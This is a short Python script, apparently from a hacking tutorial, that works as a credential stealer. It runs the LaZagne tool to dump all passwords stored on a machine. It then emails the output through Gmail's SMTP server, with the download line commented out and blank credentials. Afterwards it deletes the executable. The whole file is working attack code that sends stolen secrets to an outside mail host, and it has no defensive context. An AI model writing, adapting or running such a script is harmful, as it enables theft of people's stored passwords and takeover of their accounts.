#!/usr/bin/env python
import requests, subprocess, smtplib, os, tempfile

def download(url):
    get_responce = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_responce.content)
def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
# download("lazane.exe-- file link")
result = subprocess.check_output("lazagne.exe all", shell=True)
print(result)
send_mail("", "", result)
os.remove("lazagne.exe")